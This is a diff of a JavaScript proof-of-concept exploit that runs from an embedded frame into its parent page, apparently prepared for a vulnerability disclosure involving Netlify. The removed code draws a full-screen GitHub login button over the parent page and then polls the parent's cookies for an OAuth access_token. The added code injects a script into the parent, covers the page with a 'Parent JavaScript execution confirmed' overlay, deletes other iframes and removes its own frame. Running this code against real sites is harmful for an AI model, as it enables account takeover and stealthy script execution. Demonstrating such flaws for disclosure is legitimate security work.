@@ -1,87 +1,138 @@
+/**/
 (() => {
-  const d = parent.document;
-  const w = parent;
+  try {
+    const p = parent.document;
 
-  const button = d.createElement("button");
-  button.textContent = "Continue with GitHub";
-  button.style.cssText = [
-    "position:fixed",
-    "inset:0",
-    "z-index:2147483647",
-    "font-size:48px",
-    "cursor:pointer"
-  ].join(";");
+    // Install actual source in the parent realm.
+    const script = p.createElement("script");
 
-  button.onclick = () => {
-    w.open(
-      "https://api.netlify.com/auth" +
-        "?provider=github" +
-        "&site_id=app.netlify.com" +
-        "&login=true" +
-        "&entry_point=direct" +
-        "&redirect=" +
-        encodeURIComponent("https://www.netlify.com/") +
-        "&use_redirect=true",
-      "_blank",
-      "noopener"
-    );
+    script.textContent = `
+      (() => {
+        // Prevent duplicate installations.
+        if (window.__parentPocInstalled) return;
+        window.__parentPocInstalled = true;
 
-    button.textContent = "Waiting for OAuth redirect…";
+        function createMarker() {
+          let marker =
+            document.getElementById("parent-poc-installed");
 
+          if (!marker) {
+            marker = document.createElement("meta");
+            marker.id = "parent-poc-installed";
+            marker.name = "parent-poc-installed";
+            marker.content = String(Date.now());
+
+            (document.head || document.documentElement)
+              .appendChild(marker);
+          }
+        }
+
+        function showProof() {
+          document.getElementById("parent-control-proof")?.remove();
+
+          const proof = document.createElement("div");
+          proof.id = "parent-control-proof";
+
+          proof.style.cssText = [
+            "position:fixed",
+            "inset:0",
+            "z-index:2147483647",
+            "display:flex",
+            "flex-direction:column",
+            "align-items:center",
+            "justify-content:center",
+            "gap:20px",
+            "background:#fff",
+            "color:#111",
+            "font:32px system-ui,sans-serif",
+            "text-align:center"
+          ].join(";");
+
+          const title = document.createElement("div");
+          title.textContent =
+            "Parent JavaScript execution confirmed";
+
+          const status = document.createElement("div");
+          status.style.font = "20px monospace";
+          status.textContent =
+            "Parent timer installed — waiting…";
+
+          const close = document.createElement("button");
+          close.textContent = "Close proof";
+          close.style.cssText =
+            "padding:12px 20px;font-size:18px;cursor:pointer";
+
+          close.onclick = () => proof.remove();
+
+          proof.append(title, status, close);
+          document.body.appendChild(proof);
+
+          // This callback is created by the parent realm.
+          window.setTimeout(() => {
+            status.textContent =
+              "Parent-owned timer survived: " +
+              new Date().toISOString();
+          }, 1500);
+        }
+
+        function start() {
+          createMarker();
+
+          if (document.body) {
+            showProof();
+          } else {
+            addEventListener("DOMContentLoaded", showProof, {
+              once: true
+            });
+          }
+        }
+
+        start();
+      })();
+    `;
+
+    (p.head || p.documentElement).appendChild(script);
+    script.remove();
+
+    /*
+     * Wait until the parent-owned script confirms installation.
+     * Only then remove the temporary execution frame.
+     */
     let attempts = 0;
 
-    function readAfterRedirect() {
+    function cleanup() {
       attempts++;
 
-      const cookieMatch = d.cookie.match(
-        /(?:^|;\s*)_initial_landing_page=([^;]*)/
-      );
+      try {
+        const installed =
+          p.getElementById("parent-poc-installed");
 
-      if (cookieMatch) {
-        let landingPage = cookieMatch[1];
+        if (installed) {
+          p.querySelectorAll(
+            ".fk-d-tooltip__trigger," +
+            'iframe[src^="https://www.google.com/maps/embed"],' +
+            'iframe[aria-hidden="true"]'
+          ).forEach(element => {
+            if (element !== window.frameElement) {
+              element.remove();
+            }
+          });
 
-        try {
-          landingPage = decodeURIComponent(landingPage);
-        } catch {}
-
-        const tokenMatch = landingPage.match(
-          /(?:^|[?#&])access_token=([^&#]+)/
-        );
-
-        if (tokenMatch) {
-          const token = tokenMatch[1];
-          const redacted =
-            token.slice(0, 4) + "…" + token.slice(-4);
-
-          button.textContent =
-            "OAuth completed\n" +
-            "Token readable: " + redacted + "\n" +
-            "Length: " + token.length;
+          const frame = window.frameElement;
+          if (frame) frame.remove();
 
           return;
         }
-      }
+      } catch {}
 
-      if (attempts < 120) {
-        w.setTimeout(readAfterRedirect, 1000);
-      } else {
-        button.textContent =
-          "Timed out: cookie/token was not readable";
+      if (attempts < 100) {
+        window.setTimeout(cleanup, 100);
       }
     }
 
-    /*
-     * Check when focus returns from the OAuth window, while retaining
-     * polling as a fallback.
-     */
-    w.addEventListener(
-      "focus",
-      () => w.setTimeout(readAfterRedirect, 250),
-      { once: true }
-    );
-
-    w.setTimeout(readAfterRedirect, 1000);
-  };
-
-  d.body.appendChild(button);
+    cleanup();
+  } catch (error) {
+    console.error("Safe parent PoC failed:", error);
+  }
 })();
+//({"counts":{}})
